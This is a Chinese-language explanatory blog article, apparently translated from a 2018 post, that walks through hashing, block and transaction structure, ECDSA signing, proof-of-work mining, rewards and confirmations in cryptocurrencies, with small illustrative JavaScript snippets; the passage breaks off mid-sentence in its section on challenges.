Photos</a></em></p>
<h2 id="目錄table-of-contents">📖 目錄（Table of Contents）</h2>
<ul>
<li><a href="#引言">引言</a></li>
<li><a href="#加密雜湊函數-cryptographic-hash-function">加密雜湊函數</a>
(Cryptographic Hash Function)</li>
<li><a href="#資料結構-data-structure">資料結構</a> (Data Structure)
<ul>
<li><a href="#區塊-block">區塊</a> (Block)</li>
<li><a href="#區塊鏈-blockchain">區塊鏈</a> (Blockchain)</li>
</ul></li>
<li><a
href="#交易與加密學-transactions-and-cryptography">交易與加密學</a>
(Transactions and Cryptography)
<ul>
<li><a href="#交易-transaction">交易</a> (Transaction)</li>
<li><a href="#加密學-cryptography">加密學</a> (Cryptography)</li>
</ul></li>
<li><a href="#帳戶餘額-account-balance">帳戶餘額</a> (Account
Balance)</li>
<li><a
href="#工作量證明與挖礦與難題-proof-of-work-mining-and-puzzle">工作量證明、挖礦與難題</a>
(Proof of Work, Mining, and Puzzle)
<ul>
<li><a href="#工作量證明共識-proof-of-work-consensus">工作量證明共識</a>
(Proof of Work Consensus)</li>
</ul></li>
<li><a
href="#獎勵與交易費用-rewards-and-transaction-fees">獎勵與交易費用</a>
(Rewards and Transaction Fees)</li>
<li><a href="#確認與分支-confirmation-and-fork">確認與分支</a>
(Confirmation and Fork)</li>
<li><a
href="#整體流程簡介3-分鐘-overview-of-the-process-3-minutes">整體流程簡介（3
分鐘）</a> (Overview of the Process)</li>
<li><a
href="#分散式共識與挖礦替代方案-distributed-consensus-and-mining-alternatives">分散式共識與挖礦替代方案</a>
(Distributed Consensus and Mining Alternatives)</li>
<li><a
href="#加密貨幣面臨的挑戰-challenges-facing-cryptocurrencies">加密貨幣面臨的挑戰</a>
(Challenges Facing Cryptocurrencies)</li>
<li><a href="#下一步-next-steps">下一步</a> (Next Steps)</li>
</ul>
<h2 id="引言">引言</h2>
<p>加密貨幣 (Cryptocurrency) 是一個相當複雜的主題。如果你想知道交易
(Transaction) 背後的運作原理、什麼是區塊鏈 (Blockchain)、挖礦 (Mining)
的目的是什麼，或者加密貨幣的限制在哪裡，這篇文章將為你解答！它將詳細解釋加密貨幣的各個組成部分
😃。</p>
<p>這篇文章是我學習挑戰的一部分，我每個月學習一個主題。本月的主題是區塊鏈
(Blockchain) 與加密貨幣 (Cryptocurrency)。我的學習內容基於 <a
target="_blank" rel="noopener" href="https://www.coursera.org/">Coursera 的 MOOC
課程</a>、幾篇文章、白皮書，以及我自己開發的權益證明 (Proof of Stake)
加密貨幣和貨幣生成器。如果你想了解更多關於我的學習方法，請點擊<a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/how-to-learn-one-topic-every-month-3f6a695b4b8b">這裡</a>。</p>
<p>如果你不了解什麼是加密貨幣
(Cryptocurrency)，建議先閱讀以下文章：<br />
<strong><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/why-cryptocurrencies-matter-37dd736bc8d0?source=post_page-----95950c002b8f---------------------------------------">為什麼加密貨幣很重要？</a></strong></p>
<p>加密貨幣 (Cryptocurrency) 由以下四個核心組成部分構成：</p>
<ol type="1">
<li><strong>資料結構 (Data Structure)</strong>（大多數情況下是區塊鏈
(Blockchain)）</li>
<li><strong>加密學 (Cryptography)</strong></li>
<li><strong>運行節點的獎勵 (Node Incentives)</strong></li>
<li><strong>去中心化（點對點）共識 (Decentralized Peer-to-Peer
Consensus)</strong></li>
</ol>
<h2 id="加密雜湊函數-cryptographic-hash-function">加密雜湊函數
(Cryptographic Hash Function)</h2>
<p>在深入了解加密貨幣 (Cryptocurrency)
之前，我們先來看看加密貨幣的核心元素之一：<strong>加密雜湊函數
(Cryptographic Hash
Function)</strong>。它在加密貨幣中有多種用途，例如作為識別碼或驗證資料未被修改。</p>
<blockquote>
<p>加密雜湊函數 (Cryptographic Hash Function)
是一種數學演算法，將任意大小的資料映射到固定大小的位元串（雜湊值
(Hash)），並設計為單向函數，幾乎無法逆向推導。（來源：<a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">維基百科</a>）</p>
</blockquote>
<p>常見的加密雜湊函數 (Cryptographic Hash Function) 包括 SHA-256、Scrypt
和 X11（使用 11 種不同的雜湊函數）。<br />
你可以在這裡測試 SHA-256：<a
target="_blank" rel="noopener" href="https://jsfiddle.net/sandoche/e0jmqLok/">JSFiddle</a>.</p>
<h2 id="資料結構-data-structure">資料結構 (Data Structure)</h2>
<p>資料結構 (Data Structure) 是每種加密貨幣 (Cryptocurrency)
的骨架。我們來談談最著名的資料結構：<strong>區塊鏈
(Blockchain)</strong>。</p>
<h3 id="區塊-block">區塊 (Block)</h3>
<p>大多數加密貨幣 (Cryptocurrency) 使用區塊鏈 (Blockchain)
資料結構。顧名思義，區塊鏈 (Blockchain) 是由包含資料的區塊 (Block)
串聯而成。簡單吧？😬😬</p>
<p>以下是一個簡單區塊 (Block) 結構的範例：</p>
<ul>
<li><strong>previousHash</strong>：前一個區塊的雜湊值 (Hash)</li>
<li><strong>timestamp</strong>：日期時間碼 (Timestamp)</li>
<li><strong>data</strong>：在加密貨幣中，通常包含交易 (Transaction)
資料</li>
<li><strong>nonce</strong>：一個整數（用於挖礦
(Mining)，後面會解釋）</li>
<li><strong>hash</strong>：當前區塊的雜湊值 (Hash)，計算方式如下：</li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> hash <span class="op">=</span> <span class="fu">H</span>(previousHash <span class="op">+</span> timestamp <span class="op">+</span> data<span class="op">.</span><span class="fu">toString</span>() <span class="op">+</span> nonce)</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="co">// H(x) 是雜湊函數 (Hash Function)</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">// + 表示串聯</span></span></code></pre></div>
<p>請注意，某些加密貨幣 (Cryptocurrency) 會在雜湊值 (Hash) 或地址
(Address) 前加上前綴，以區分不同的貨幣。</p>
<h3 id="區塊鏈-blockchain">區塊鏈 (Blockchain)</h3>
<p>了解了區塊 (Block) 結構後，區塊鏈 (Blockchain)
的概念就更簡單了。區塊鏈 (Blockchain) 看起來像這樣：</p>
<figure>
<img
src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ATo4tS9ZYxM_IA7IdTfF7A.png"
alt="區塊鏈結構" />
<figcaption aria-hidden="true">區塊鏈結構</figcaption>
</figure>
<p>這種資料結構的強大之處在於，如果你更改某個區塊 (Block)
的資料，必須重新計算該區塊的雜湊值 (Hash)，這會使下一個區塊的
<code>previousHash</code> 失效。如下圖所示：</p>
<figure>
<img
src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NmHIJUIgrr4WLboV3uRLxQ.png"
alt="區塊資料更改的影響" />
<figcaption aria-hidden="true">區塊資料更改的影響</figcaption>
</figure>
<p>特別的是，第一個區塊沒有
<code>previousHash</code>，稱為<strong>創世區塊 (Genesis
Block)</strong>。</p>
<p>區塊鏈 (Blockchain) 資料結構被大多數加密貨幣（如比特幣
(Bitcoin)、萊特幣 (Litecoin)、以太坊 (Ethereum)）使用。後續的共識機制
(Consensus Mechanism) 部分將介紹其他使用不同資料結構的加密貨幣。</p>
<p>由於這種結構結合了良好的去中心化共識 (Decentralized
Consensus)，幾乎不可能更改區塊鏈 (Blockchain) 中的資料。儲存在區塊鏈
(Blockchain) 中的資料將永遠存在，幾乎無法被移除 😮。</p>
<p>此外，任何類型的資料都可以使用這種資料結構儲存。比特幣 (Bitcoin) 使用
<a target="_blank" rel="noopener" href="https://github.com/google/leveldb">LevelDB</a>（一種鍵值儲存庫
(Key-Value Store)）來儲存區塊鏈 (Blockchain) 資料，因為區塊透過雜湊值
(Hash) 識別，鍵值儲存是最適合的解決方案。</p>
<p>通過將交易 (Transaction) 添加到區塊鏈 (Blockchain) 的區塊 (Block)
中，你可以將其轉化為一個<strong>分類帳 (Ledger)</strong>。</p>
<h2 id="交易與加密學-transactions-and-cryptography">交易與加密學
(Transactions and Cryptography)</h2>
<p>現在我們了解了區塊鏈 (Blockchain)，接下來談談交易 (Transaction)
及其處理方式。</p>
<h3 id="交易-transaction">交易 (Transaction)</h3>
<p>以下是交易 (Transaction) 創建前的結構：</p>
<ul>
<li><strong>transactionInputs[]</strong>：交易輸入 (Transaction Input)
陣列</li>
<li><strong>transactionOutputs[]</strong>：交易輸出 (Transaction Output)
陣列</li>
<li><strong>id</strong>：由 <code>transactionInputs[]</code> 和
<code>transactionOutputs[]</code> 的內容計算出的雜湊值 (Hash)</li>
</ul>
<p>交易輸出 (Transaction Output) 和交易輸入 (Transaction Input)
的結構如下：</p>
<p><strong>transactionOutput</strong>：</p>
<ul>
<li><strong>address</strong>：交易接收者的地址 (Address)</li>
<li><strong>amount</strong>：發送到該地址的加密貨幣數量</li>
</ul>
<p><strong>transactionInput</strong>：</p>
<ul>
<li><strong>transactionOutputId</strong>：之前交易的 ID/雜湊值
(Hash)，作為輸入的來源</li>
<li><strong>transactionOutputIndex</strong>：用於查找
<code>transactionOutputs[]</code> 陣列中正確輸出的索引</li>
</ul>
<p>交易 (Transaction)
的規則是：<strong>每個交易的輸入總和必須等於輸出總和</strong>。例如，如果
Alice 收到 30 個貨幣，想發送 10 個，她必須將剩餘的 20
個發送給自己！這是比特幣 (Bitcoin)
為了加快交易驗證而採用的方式，避免每次交易都檢查完整的歷史記錄。</p>
<p>以下是一個範例： 假設有三個人：</p>
<ul>
<li>Alice（地址：<code>0xA</code>）</li>
<li>John（地址：<code>0xJ</code>）</li>
<li>Bob（地址：<code>0xB</code>）</li>
</ul>
<p>這些地址是他們的公開金鑰 (Public Key)。Alice 擁有 30 個貨幣（來自
John 在交易 ID <code>0x5645464</code> 中發送給她的），Bob 擁有 0
個貨幣。Alice 想發送 10 個貨幣給 Bob。</p>
<p>Alice 會創建以下交易 (Transaction)：</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 第一個交易輸出給 Bob</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> txOut1 <span class="op">=</span> &#123;</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">amount</span><span class="op">:</span> <span class="dv">10</span><span class="op">,</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">address</span><span class="op">:</span> <span class="st">&#39;0xB&#39;</span> <span class="co">// Bob 的地址 (Address)</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="co">// 第二個交易輸出給 Alice 自己</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> txOut2 <span class="op">=</span> &#123;</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">amount</span><span class="op">:</span> <span class="dv">20</span><span class="op">,</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">address</span><span class="op">:</span> <span class="st">&#39;0xA&#39;</span> <span class="co">// Alice 的地址 (Address)</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="co">// 交易輸入</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="co">// transactionOutputId 是 John 之前發送 30 個貨幣給 Alice 的交易 ID</span></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> txIn <span class="op">=</span> &#123;</span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>  <span class="dt">transactionOutputId</span><span class="op">:</span> <span class="st">&#39;0x5645464&#39;</span><span class="op">,</span></span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>  <span class="dt">transactionOutputIndex</span><span class="op">:</span> <span class="dv">0</span></span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="co">// 創建交易</span></span>
<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> tx <span class="op">=</span> &#123;</span>
<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>  <span class="dt">transactionOutputs</span><span class="op">:</span> [txOut1<span class="op">,</span> txOut2]<span class="op">,</span></span>
<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>  <span class="dt">transactionInputs</span><span class="op">:</span> [txIn]<span class="op">,</span></span>
<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="co">// 接著需要計算交易的雜湊值 (Hash)。詳細流程可以參考以下教程：[交易教程](https://lhartikk.github.io/).</span></span></code></pre></div>
<p>幸運的是，你不需要親自完成這些步驟，你的錢包軟體 (Wallet Software)
會自動處理！</p>
<p>交易 (Transaction) 創建後，必須簽署 (Sign) 才能廣播 (Broadcast)
到節點 (Node) 並成為區塊 (Block) 的一部分。</p>
<h3 id="加密學-cryptography">加密學 (Cryptography)</h3>
<p>這就是加密學 (Cryptography) 發揮作用的地方。</p>
<p>比特幣 (Bitcoin) 和其他許多加密貨幣 (Cryptocurrency)
使用<strong>橢圓曲線數位簽章演算法 (ECDSA, Elliptic Curve Digital
Signature Algorithm)</strong> 來保護交易 (Transaction)
安全，並生成公開金鑰 (Public Key) 和私密金鑰 (Private Key)。</p>
<p>每個比特幣 (Bitcoin) 使用者需要兩把金鑰：</p>
<ul>
<li><strong>私密金鑰 (Private Key)</strong>（秘密金鑰）</li>
<li><strong>公開金鑰 (Public Key)</strong>（用作地址
(Address)，也用於接收貨幣）</li>
</ul>
<p>私密金鑰 (Private Key) 是隨機生成的，公開金鑰 (Public Key) 則透過
ECDSA 演算法生成。具體生成方式可參考：<a
target="_blank" rel="noopener" href="https://bitcoin.stackexchange.com/questions/25024/how-do-you-get-a-bitcoin-public-key-from-a-private-key#29880">技術文章</a>（非常技術性）。</p>
<p>ECDSA 演算法是單向的，你可以從私密金鑰 (Private Key) 生成公開金鑰
(Public Key)，但無法從公開金鑰 (Public Key) 推導出私密金鑰 (Private
Key)。</p>
<p>這兩把金鑰用於簽署交易 (Sign
Transaction)（即我們之前創建的交易）。簽章 (Signature)
可以透過另一個函數驗證，該函數接受交易資料和用於簽署的公開金鑰 (Public
Key)，並返回簽章是否有效。技術細節可參考：<a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#Signature_generation_algorithm">維基百科</a>.</p>
<p>簽署 (Sign) 完成後，交易 (Transaction) 可以廣播 (Broadcast)
到網絡。</p>
<p>節點 (Node) 收到交易 (Transaction) 後，會先檢查其有效性：無雙重支付
(Double Spending)、帳戶餘額 (Account Balance)
有效、輸入金額等於輸出金額、簽章 (Signature)
有效。然後將交易添加到交易池 (Transaction
Pool)（與其他節點共享），並將其加入區塊 (Block)。</p>
<h2 id="帳戶餘額-account-balance">帳戶餘額 (Account Balance)</h2>
<p>為了計算每個帳戶的餘額，比特幣 (Bitcoin) 和其他加密貨幣
(Cryptocurrency) 使用 <strong>UTxO（未花費交易輸出, Unspent Transaction
Output）</strong>。</p>
<p>簡單來說，比特幣 (Bitcoin) 在區塊鏈 (Blockchain) 之外儲存每個地址
(Address) 接收但尚未花費的交易
(Transaction)。通過計算某個帳戶的未花費交易總和，就可以知道該帳戶的餘額。此值用於確保某人不會花費超過其擁有的金額。</p>
<p>UTxO 儲存在每個節點 (Node) 本地管理的資料庫中，以便快速處理和驗證交易
(Transaction)，而無需檢查整個區塊鏈 (Blockchain)。</p>
<h2
id="工作量證明與挖礦與難題-proof-of-work-mining-and-puzzle">工作量證明與挖礦與難題
(Proof of Work, Mining, and Puzzle)</h2>
<p>由於加密貨幣 (Cryptocurrency) 採用去中心化的點對點網絡 (Decentralized
Peer-to-Peer Network)，運行加密貨幣軟體的節點
(Node)（電腦）必須決定哪些交易 (Transaction) 應包含在下一個區塊 (Block)
中，並達成共識 (Consensus)。</p>
<p>不同的共識機制 (Consensus Mechanism) 定義了這些規則。比特幣 (Bitcoin)
使用的最早共識機制是<strong>工作量證明 (Proof of
Work)</strong>，也是最常用的。</p>
<p>在解釋工作量證明 (Proof of Work)
之前，讓我們看看如果沒有工作量證明會發生什麼。</p>
<p>假設有一種名為 SmallCoin 的小型加密貨幣 (Cryptocurrency)，擁有 3
個節點 (Node)（X、Y、Z），每個區塊 (Block) 最多包含 3 筆交易
(Transaction)，並每小時添加一個區塊到區塊鏈 (Blockchain)。Alice 廣播
(Broadcast) 了 3 筆交易，Bob 廣播了另外 3 筆交易，且所有交易都有效。節點
X 決定包含 Alice 的 3 筆交易，節點 Y 決定包含 Bob 的 3 筆交易，節點 Z
則選擇 2 筆 Alice 的交易和 1 筆 Bob 的交易。</p>
<p>誰是對的？🤔 所有節點 (Node) 如何就下一個區塊 (Block)
達成一致？一種解決方案是每次隨機選擇一個節點，如同抽籤。但問題在於：如果某個節點（例如
X）運行 97 個額外的節點（例如運行 97
個軟體實例），它將擁有控制權，可以黑名單某些用戶，例如永遠不接受 Bob
的交易！這被稱為 <strong>Sybil 攻擊 (Sybil Attack)</strong>。</p>
<p>在現實中，比特幣 (Bitcoin) 區塊鏈 (Blockchain) 每 10 分鐘添加一個區塊
(Block)，區塊大小限制為 1 MB（而非 3 筆交易的限制）。截至 2018 年 4 月
13 日，運行中的比特幣節點 (Node) 約有 10,050 個（參考：<a
target="_blank" rel="noopener" href="https://bitnodes.earn.com/">Bitnodes</a>）。比特幣 (Bitcoin)
使用工作量證明 (Proof of Work) 共識來對抗 Sybil 攻擊 (Sybil
Attack)。</p>
<h3 id="工作量證明共識-proof-of-work-consensus">工作量證明共識 (Proof of
Work Consensus)</h3>
<p>與其隨機選擇節點 (Node) 的區塊 (Block)，節點必須解決一個計算難題
(Computational Puzzle)。最早解決難題的節點將被選中，其區塊 (Block)
將被添加到區塊鏈 (Blockchain)。</p>
<p>難題的運作方式如下： 回想區塊 (Block) 結構，包含時間戳
(Timestamp)、資料、<code>nonce</code> 和雜湊值 (Hash)。<strong>挖礦
(Mining)</strong> 是指不斷增加 <code>nonce</code> 並計算雜湊值
(Hash)，直到雜湊值以特定數量的 0 開頭（稱為難度 (Difficulty)）。</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> hash <span class="op">=</span> <span class="fu">H</span>(previousHash <span class="op">+</span> timestamp <span class="op">+</span> data<span class="op">.</span><span class="fu">toString</span>() <span class="op">+</span> nonce)</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co">// 比特幣使用的雜湊函數是 SHA-256，由 NSA 創建</span></span></code></pre></div>
<p>我製作了一個 JSFiddle 讓你理解挖礦 (Mining) 的運作：<a
target="_blank" rel="noopener" href="https://jsfiddle.net/sandoche/784kdgnp/">JSFiddle</a>.
你可以更改傳遞給雜湊函數 (Hash Function) 的資料以及挖礦難度 (Mining
Difficulty)。</p>
<p>當節點 (Node) 找到符合難度的 <code>nonce</code> 時，它會將區塊
(Block) 廣播 (Broadcast) 到網絡，該區塊將成為區塊鏈 (Blockchain)
的下一個區塊。找到區塊的節點將獲得獎勵 (Reward)，以激勵人們通過運行礦機
(Mining Rig) 來提高網絡安全性。</p>
<p>由於區塊 (Block) 包含雜湊值 (Hash)、交易
(Transaction)、<code>nonce</code> 和時間戳 (Timestamp)，其他節點 (Node)
可以輕鬆驗證區塊的有效性及工作量證明 (Proof of Work)
是否完成。無法通過作弊跳過 <code>nonce</code> 嘗試。</p>
<p>如果兩個區塊 (Block) 同時被發送，會出現分叉
(Fork)，但規則是將區塊添加到最長的分支 (Longest
Chain)，因此較短的分支最終會被放棄。</p>
<p>基本上，與其進行隨機抽籤，節點 (Node) 的計算能力越強，驗證下一個區塊
(Block) 的機會就越大。這使得控制區塊鏈 (Blockchain)
變得困難，因為你需要全球 51% 的計算能力才能阻止某些交易 (Transaction)
或將其列入黑名單。這就是工作量證明 (Proof of Work) 的目的：使雙重支付
(Double Spending)
或改寫歷史變得困難。因為要擁有計算能力，你需要投資於挖礦硬件 (Mining
Hardware)。</p>
<p>比特幣 (Bitcoin) 最初設計為使用 CPU 進行挖礦
(Mining)，因此全球許多電腦都在挖礦。但隨著比特幣價值上升#&gt;
隨著比特幣價值上升，人們開始投入更多資源。他們從使用 GPU 挖礦，進而使用
FPGA（現場可編程門陣列 (Field-Programmable Gate Array)，特別適合 SHA-256
計算），現在比特幣礦工使用 ASIC（專用積體電路 (Application-Specific
Integrated Circuit)），這些設備專為比特幣挖礦（以及其他一些貨幣）設計
😱，但其唯一用途就是挖礦。挖礦在硬件（購買）方面成本高昂，運行和冷卻也消耗大量電力。我們稍後將討論能源浪費的問題。但這就是工作量證明
(Proof of Work) 的交易：將能源和工作轉化為貨幣和安全性。</p>
<p>由於即使使用最新的 ASIC 也可能需要數年才能找到第一個區塊
(Block)，礦工通常會加入礦池 (Mining Pool) 合作。礦池讓礦工一起尋找
<code>nonce</code>，並根據找到的股份 (Share) 數量分配獎勵 (Reward)。股份
(Share) 是指以比難度 (Difficulty) 略低的 0 開頭的雜湊值 (Hash)。</p>
<p>以下是一個難度 (Difficulty) 為 6 的範例：</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 無效雜湊 (Invalid Hash)</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="dv">18</span><span class="er">ea285983df355f3024e412fb46ad6cbd98a7ffe6872e26612e35f38aa39c41</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co">// 無效雜湊 (Invalid Hash)</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="dv">0146415487</span><span class="er">f165835c00d441602290f7aa494f91b93fd9ec2c5d280f17f999c0</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co">// 無效雜湊 (Invalid Hash)，但因以 5 個 0 開頭而視為股份 (Share)</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="dv">00000</span><span class="er">eeff9839efeb3e528ade5789d90b8721c34c49718eeb9626f5a29b1350b</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="co">// 有效雜湊 (Valid Hash)</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="dv">000000</span><span class="er">b8e1ae46744ccd94bdae212ed43f4a586df68a6348e39fa7fd13e9db5c</span></span></code></pre></div>
<p>一個重要的細節是，無論有多少設備在挖礦 (Mining)，比特幣 (Bitcoin)
的兩個區塊 (Block) 之間的時間將保持在約 10 分鐘，這通過每兩週調整難度
(Difficulty) 來實現。你可以在這裡查看調整難度的程式碼範例：<a
target="_blank" rel="noopener" href="https://lhartikk.github.io/jekyll/update/2017/07/13/chapter2.html">難度調整教程</a>.</p>
<p>你可以在下圖中看到比特幣 (Bitcoin) 的雜湊率 (Hash Rate) 和難度
(Difficulty)：</p>
<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*s0NNN4yb2_uPV8oH." alt="pic"></p>
<p><em>來源：<a
target="_blank" rel="noopener" href="https://bitcoinwisdom.com/bitcoin/difficulty">Bitcoin
Wisdom</a></em></p>
<p>最後一點，即使不挖礦 (Mining) 也可以運行比特幣節點 (Bitcoin
Node)，這樣做的唯一目的是在進行交易 (Transaction) 時不依賴任何可能記錄你
IP 地址的中介。但不挖礦的節點不會獲得獎勵 (Reward) 😔。</p>
<h2 id="獎勵與交易費用-rewards-and-transaction-fees">獎勵與交易費用
(Rewards and Transaction Fees)</h2>
<p>如前所述，獎勵 (Reward) 是激勵用戶成為礦工 (Miner)
的手段，以確保網絡安全。如果沒有礦工
(Miner)，網絡無法安全運行；如果沒有獎勵 (Reward)
💵，沒有人會願意浪費能源（也就是金錢）。</p>
<p>每種貨幣有自己的獎勵 (Reward)
規則，你可以在源代碼中找到。例如，狗狗幣 (Dogecoin)（迷因幣 (Meme
Coin)）在其最初幾個月提供隨機獎勵 (Random Reward)。</p>
<p>在比特幣 (Bitcoin) 中，每個驗證區塊 (Block) 的節點 (Node) 目前可獲得
12.5 BTC，此金額每 4 年減半 (Halving)。這是比特幣創建者預定義通脹率
(Inflation Rate) 的方式！無人能更改。你可以在這裡查看下一次減半
(Halving) 的日期：<a target="_blank" rel="noopener" href="http://www.bitcoinblockhalf.com/">Bitcoin
Block Half</a>.</p>
<p>為了獲得此獎勵 (Reward)，礦工 (Miner) 在進行挖礦難題 (Mining Puzzle)
前會在區塊 (Block) 中添加一筆名為 <strong>Coinbase 交易 (Coinbase
Transaction)</strong>
的交易。此交易不包含任何輸入，僅包含一個輸出，輸出金額為獎勵金額，接收者為礦工的地址
(Address)。一旦區塊 (Block) 被添加到區塊鏈 (Blockchain)，礦工 (Miner)
即可保留此獎勵 (Reward)。</p>
<p>此外，當你進行交易 (Transaction) 時，必須設定交易費用 (Transaction
Fee)。此費用由礦工 (Miner) 收取。如果交易量過多，礦工 (Miner)
會優先處理費用較高的交易。因此，你需要支付更高的費用才能讓交易更快被處理。</p>
<p>某些加密貨幣 (Cryptocurrency) 不提供獎勵 (Reward)，僅向節點 (Node)
提供交易費用 (Transaction
Fee)；有些甚至不提供交易費用。在這些情況下，所有貨幣在創世區塊 (Genesis
Block) 中創建，然後分發或出售給用戶。</p>
<h2 id="確認與分支-confirmation-and-fork">確認與分支 (Confirmation and
Fork)</h2>
<p>最後一個需要理解的重要概念是交易的<strong>確認數 (Confirmation
Number)</strong>。確認數 (Confirmation Number) 是指區塊鏈 (Blockchain)
中包含交易 (Transaction) 的區塊 (Block) 之後的區塊數量。</p>
<p>如前所述，區塊鏈 (Blockchain) 有時會出現分支 (Fork)，礦工 (Miner)
傾向於將區塊 (Block) 添加到最長的分支 (Longest
Chain)（實際上是用最多挖礦能力 (Mining Power) 構建的分支）。如果你的交易
(Transaction) 被添加到區塊鏈
(Blockchain)，但另一個分支變得更重要，較小的分支將成為孤分支 (Orphaned
Branch)，你的交易將不再是分類帳 (Ledger) 的一部分。</p>
<p>在比特幣 (Bitcoin) 中，如果一筆交易 (Transaction) 獲得超過 6 個確認
(Confirmation)，則被認為是安全的，不太可能成為孤分支 (Orphaned
Branch)。因此，如果你使用比特幣 (Bitcoin)
賣商品或服務，務必在交付前確保獲得 6 個確認 (Confirmation)。</p>
<h2
id="整體流程簡介3-分鐘-overview-of-the-process-3-minutes">整體流程簡介（3
分鐘） (Overview of the Process (3 Minutes))</h2>
<p>現在你已經了解了最重要的概念，我建議你觀看以下影片，它將提供整個流程的良好概述和總結：</p>
<p><a target="_blank" rel="noopener" href="https://youtu.be/M_zCjjy59cg?si=h1tOhDvcvNlMlAk0"><img
src="https://img.youtube.com/vi/M_zCjjy59cg/0.jpg"
alt="影片縮圖" /></a></p>
<p>如果你想查看區塊 (Block) 的具體內容，這裡是一個比特幣 (Bitcoin)
區塊的內容：<a
target="_blank" rel="noopener" href="https://blockchain.info/fr/block/0000000000000000004f6b895db5e2dd336ccdecb42f3c829109096938882c8e">Blockchain.info</a>.</p>
<h2
id="分散式共識與挖礦替代方案-distributed-consensus-and-mining-alternatives">分散式共識與挖礦替代方案
(Distributed Consensus and Mining Alternatives)</h2>
<p>到目前為止，我們主要聚焦於比特幣 (Bitcoin)、區塊鏈 (Blockchain)
資料結構和工作中量證明 (Proof of Work) 共識；但自比特幣 (Bitcoin)
誕生以來，許多替代方案已經出現 😃。共識 (Consensus) 的目標是讓節點
(Node) 就哪些交易 (Transaction)
有效達成一致，並避免攻擊，例如雙重支付攻擊 (Double Spending
Attack)、DDoS 攻擊 (DDoS Attack) 或黑名單攻擊 (Blacklist
Attack)。我在以下文章中詳細介紹了這些：</p>
<p><strong><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/proof-of-what-understand-the-distributed-consensuses-in-blockchain-1d9304ae4afe">什麼是共識機制？
(What is a Consensus Mechanism?)</a></strong></p>
<h2
id="加密貨幣面臨的挑戰-challenges-facing-cryptocurrencies">加密貨幣面臨的挑戰
(Challenges Facing Cryptocurrencies)</h2>
<p>以下是加密貨幣 (Cryptocurrency) 面臨的主要挑戰：</p>
<h3 id="可擴展性-scalability">可擴展性 (Scalability)</h3>
<p>首要且最重要的挑戰是可擴展性
(Scalability)。隨著用戶數量增加，加密貨幣 (Cryptocurrency)
必須保持穩定。請注意，每個節點 (Node) 需要儲存區塊鏈 (Blockchain)
的完整副本，比特幣 (Bitcoin) 區塊鏈目前約 160 GB！</p>
<h3 id="速度-speed">速度 (Speed)</h3>
<p>加密貨幣 (Cryptocurrency) 應能與 Visa 競爭，Visa 在高峰期可處理每秒
